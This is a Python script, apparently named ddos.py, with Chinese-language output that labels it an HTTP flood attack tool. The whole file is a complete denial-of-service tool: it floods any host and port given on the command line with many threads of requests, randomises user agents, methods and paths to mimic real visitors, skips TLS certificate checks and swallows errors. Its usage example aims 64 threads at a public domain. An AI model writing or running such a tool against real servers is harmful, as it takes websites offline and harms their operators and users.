import http.client
import threading
import time
import socket
import random
import sys
import argparse


class HTTPFloodDemo:

    def __init__(self, target, port=80, threads=10):
        self.target = target
        self.port = port
        self.threads = threads
        self.running = False
        self.request_count = 0
        self.lock = threading.Lock()

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
        ]

    def generate_http_request(self):
        paths = ["/", "/index.html", "/api/data", "/login", "/search?q=test"]
        methods = ["GET", "POST", "HEAD"]

        method = random.choice(methods)
        path = random.choice(paths)
        headers = {
            "User-Agent": random.choice(self.user_agents),
            "Accept": "text/html,application/xhtml+xml",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
        }

        return method, path, headers

    def attack_thread(self, thread_id):

        while self.running:
            try:
                if self.port == 443:
                    import ssl
                    context = ssl._create_unverified_context()
                    conn = http.client.HTTPSConnection(
                        self.target, self.port,
                        context=context, timeout=2
                    )
                else:
                    conn = http.client.HTTPConnection(
                        self.target, self.port, timeout=2
                    )

                method, path, headers = self.generate_http_request()

                if method == "POST":
                    body = "data=" + "x" * random.randint(10, 100)
                    headers["Content-Type"] = "application/x-www-form-urlencoded"
                    conn.request(method, path, body=body, headers=headers)
                else:
                    conn.request(method, path, headers=headers)

                conn.close()

                with self.lock:
                    self.request_count += 1

                time.sleep(random.uniform(0, 0.01))

            except (ConnectionRefusedError, socket.timeout, OSError):
                pass
            except Exception:
                pass

    def monitor_thread(self):

        last_count = 0
        while self.running:
            time.sleep(1)
            with self.lock:
                current_count = self.request_count
                rate = current_count - last_count
                last_count = current_count
                print(f"攻击速率: {rate} 请求/秒, 总计: {current_count} 请求")

    def start(self, duration=10):

        print(f"[!] 开始HTTP Flood攻击")
        print(f"[!] 目标: {self.target}:{self.port}")
        print(f"[!] 线程数: {self.threads}")
        print(f"[!] 持续时间: {duration}秒")
        print("-" * 50)

        self.running = True

        monitor = threading.Thread(target=self.monitor_thread)
        monitor.daemon = True
        monitor.start()

        threads_list = []
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads_list.append(thread)

        try:
            time.sleep(duration)
        except KeyboardInterrupt:
            print("\n[!] 手动停止")

        self.running = False
        for thread in threads_list:
            thread.join(timeout=1)

        print(f"\n[!] 攻击结束，总共发送 {self.request_count} 个请求")


def parse_args():
    parser = argparse.ArgumentParser(
        description='HTTP Flood 攻击工具',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
使用示例:
  python ddos.py -H 127.0.0.1 -p 80 -t 16 -d 30
  python ddos.py --host example.com --port 443 --threads 64 --duration 60
        '''
    )

    parser.add_argument(
        '-H', '--host',
        type=str,
        required=True,
        help='目标主机IP或域名 (必填)'
    )

    parser.add_argument(
        '-p', '--port',
        type=int,
        default=80,
        help='目标端口，默认: 80'
    )

    parser.add_argument(
        '-t', '--threads',
        type=int,
        default=16,
        help='并发线程数，默认: 16'
    )

    parser.add_argument(
        '-d', '--duration',
        type=int,
        default=10,
        help='攻击持续时间(秒)，默认: 10'
    )

    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()

    demo = HTTPFloodDemo(
        target=args.host,
        port=args.port,
        threads=args.threads
    )
    demo.start(duration=args.duration)